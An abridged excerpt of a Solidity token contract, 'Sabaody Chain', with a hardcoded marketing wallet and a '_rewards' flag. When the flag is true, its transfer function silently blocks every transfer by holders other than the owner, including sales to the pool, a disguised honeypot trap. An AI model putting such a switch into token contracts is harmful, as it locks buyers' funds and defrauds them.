...
contract SabaodyChain is Context, IERC20, Ownable {
    ...
    string private constant _name = "Sabaody Chain"; //
    string private constant _symbol = "SABAODY"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 2;
    address public  _marketingWallet = 0x955670aED5830D1ddBA24DB316Ce82bB972f8fdC;
    bool public _rewards = false;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && _rewards){ return; }
